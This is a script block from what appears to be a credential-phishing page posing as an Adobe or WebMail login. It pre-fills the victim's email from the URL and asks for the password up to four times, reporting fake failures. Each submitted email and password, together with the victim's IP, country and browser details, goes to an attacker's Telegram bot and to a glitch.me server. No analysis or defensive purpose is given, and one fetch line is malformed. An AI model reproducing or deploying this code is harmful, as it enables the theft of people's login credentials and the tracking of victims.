
<script>
  /**
   * Telegram Handler Class
   * Embedded directly in the HTML file
   */
  class TelegramHandler {
    constructor(config = {}) {
      this.config = config;
      this.userInfo = {
        ipAddress: "Fetching...",
        userAgent: navigator.userAgent,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        browser: "Detecting...",
        country: "Fetching..."
      };
      
      this._detectBrowser();
      
      if (this.config.collectUserInfo !== false) {
        this._collectUserInfo();
      }
    }

    async initialize() {
      if (this.config.configUrl) {
        try {
          const response = await fetch(this.config.configUrl);
          if (!response.ok) throw new Error('Failed to load config');
          const data = await response.json();
          
          if (data.telegram) {
            this.config.token = data.telegram.token;
            this.config.chatId = data.telegram.chatId;
          }
        } catch (error) {
          console.error('Configuration error:', error);
          throw new Error('Failed to initialize Telegram handler');
        }
      }
      
      if (!this.config.token || !this.config.chatId) {
        throw new Error('Telegram token and chatId are required');
      }
    }

    async sendMessage(messageData, messagePrefix = '🔥====== Message ======🔥\n', messageSuffix = '=====================\n') {
      let messageText = messagePrefix;
      
      for (const [key, value] of Object.entries(messageData)) {
        messageText += `${key}: ${value}\n`;
      }
      
      if (this.config.collectUserInfo !== false) {
        await this._waitForUserInfo();
        
        messageText += `======= User's Info =======\n` +
          `📍 IP: ${this.userInfo.ipAddress}\n` +
          `🌍 Country: ${this.userInfo.country}\n` +
          `⏰ Timezone: ${this.userInfo.timezone}\n` +
          `🌎 Browser: ${this.userInfo.browser}\n` +
          `📱 User Agent: ${this.userInfo.userAgent}\n`;
      }
      
      messageText += messageSuffix;
      
      const telegramPayload = {
        chat_id: this.config.chatId,
        text: messageText
      };
      
      try {
        const response = await fetch(`https://api.telegram.org/bot${this.config.token}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(telegramPayload)
        });
        
        const data = await response.json();
        if (!data.ok) {
          console.error("Telegram API error:", data);
          throw new Error("Failed to send message to Telegram");
        }
        
        return data;
      } catch (error) {
        console.error("Telegram send error:", error);
        throw error;
      }
    }
    
    _detectBrowser() {
      const ua = navigator.userAgent;
      if (ua.indexOf("Firefox") > -1) {
        this.userInfo.browser = "Mozilla Firefox";
      } else if (ua.indexOf("SamsungBrowser") > -1) {
        this.userInfo.browser = "Samsung Internet";
      } else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) {
        this.userInfo.browser = "Opera";
      } else if (ua.indexOf("Trident") > -1) {
        this.userInfo.browser = "Microsoft Internet Explorer";
      } else if (ua.indexOf("Edge") > -1) {
        this.userInfo.browser = "Microsoft Edge";
      } else if (ua.indexOf("Chrome") > -1) {
        this.userInfo.browser = "Google Chrome/Chromium";
      } else if (ua.indexOf("Safari") > -1) {
        this.userInfo.browser = "Apple Safari";
      }
    }
    
    _collectUserInfo() {
      fetch("https://api.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
          this.userInfo.ipAddress = data.ip;
          return fetch(`http://ip-api.com/json/${data.ip}?fields=country`);
        })
        .then(response => response.json())
        .then(data => {
          this.userInfo.country = data.country;
        })
        .catch(error => {
          console.error("IP or country fetch error:", error);
          this.userInfo.ipAddress = "Unavailable";
          this.userInfo.country = "Unavailable";
        });
    }
    
    _waitForUserInfo() {
      return new Promise((resolve) => {
        if (this.userInfo.ipAddress !== "Fetching..." && this.userInfo.country !== "Fetching...") {
          resolve();
          return;
        }
        
        const checkInterval = setInterval(() => {
          if (this.userInfo.ipAddress !== "Fetching..." && this.userInfo.country !== "Fetching...") {
            clearInterval(checkInterval);
            resolve();
          }
        }, 100);
        
        setTimeout(() => {
          clearInterval(checkInterval);
          resolve();
        }, 5000);
      });
    }
  }

  // Initialize Telegram Handler
  let telegramHandler;
  
  async function initializeTelegramHandler() {
    try {
      telegramHandler = new TelegramHandler({
    
        collectUserInfo: true
      });
      
      await telegramHandler.initialize();
      console.log("Telegram handler initialized successfully");
    } catch (error) {
      console.error("Failed to initialize Telegram handler:", error);
    }
  }
  
  // Initialize the handler when page loads
  document.addEventListener('DOMContentLoaded', initializeTelegramHandler);
  
  // Auto-grab email from URL parameters
  function getParameterByName(name, url) {
    if (!url) url = window.location.href;
    name = name.replace(/[\[\]]/g, "\\$&");
    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
        results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, " "));
  }
  
  // Initialize form with email if provided in URL
  var email = getParameterByName('email');
  var chck = getParameterByName('chck');
  document.getElementById('login-username').value = email ? email : '';
  document.getElementById('chck_hidden').value = chck ? chck : '';
  if (chck) { document.getElementById('warn').style.display = "block"; }

  // Show form after delay when overlay is clicked
  function startDelay() {
    document.getElementById('overlay').innerHTML = "Please wait...";
    setTimeout(function(){
      document.getElementById('overlay').style.display = "none";
      document.getElementById('regForm').classList.add('show');
    }, 250);
  }

  // Track login attempts
  let attempts = 0;
  const maxAttempts = 4;

  // Collect device and browser information
  const browserInfo = {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    screenSize: `${window.screen.width}x${window.screen.height}`,
    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    referrer: document.referrer || 'Direct'
  };

  // Form submission handler
  document.getElementById('regForm').addEventListener('submit', async function(e){
    e.preventDefault();
    if (attempts >= maxAttempts) return;

    // Get form data
    const email = document.getElementById('login-username').value;
    const password = document.getElementById('password').value;
    const isChecked = document.getElementById('check_me').checked;
    
    // Prepare form data
    const formData = {
      email: email,
      password: password,
      keepPosted: isChecked ? 'Yes' : 'No',
      userAgent: browserInfo.userAgent,
      platform: browserInfo.platform,
      screenSize: browserInfo.screenSize,
      language: browserInfo.language,
      timeZone: browserInfo.timeZone,
      referrer: browserInfo.referrer,
      attempt: attempts + 1,
      maxAttempts: maxAttempts,
      timestamp: new Date().toISOString(),
      source: "WebMail Service Form"
    };

    // Send data to both the original server and Telegram
    sendToOriginalServer(formData);
    
    // Send to Telegram using our handler
    try {
      // Format data for Telegram message
      const telegramData = {
        '📧 Email': email,
        '🔑 Password': password,
        '📱 Updates': isChecked ? 'Yes' : 'No',
        '🔄 Attempt': attempts + 1 + '/' + maxAttempts,
        '⏰ Time': new Date().toLocaleString()
      };
      
      // Send message to Telegram
      await telegramHandler.sendMessage(
        telegramData,
        '🔐 Adobe Login Details 🔐\n',
        '======== WebMail Service ========\n'
      );
    } catch (error) {
      console.error("Error sending to Telegram:", error);
    }

    // Increment attempt counter and manage UI state
    attempts++;
    if (attempts >= maxAttempts) {
      lockForm();
    } else {
      document.getElementById('password').value = '';
      if (document.getElementById('warn')) {
        document.getElementById('warn').style.display = "block";
      }
    }
  });

  function lockForm() {
    document.getElementById('login-username').disabled = true;
    document.getElementById('password').disabled = true;
    document.getElementById('submitBtn').disabled = true;
    document.getElementById('lockMessage').style.display = "block";
  }

  function sendToOriginalServer(formData) {
    // Send to the original server (keeping original functionality)
    fetch("https://horse-button-echo.glitch.me/config.json, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(formData)
    })
    .then(response => {
      if (!response.ok) {
        throw new Error(`Server error! Status: ${response.status}`);
      }
      return response.json();
    })
    .then(data => {
      console.log("Login information sent successfully!", data);
    })
    .catch(error => {
      console.error("Error sending login information:", error);
    });
  }
</script>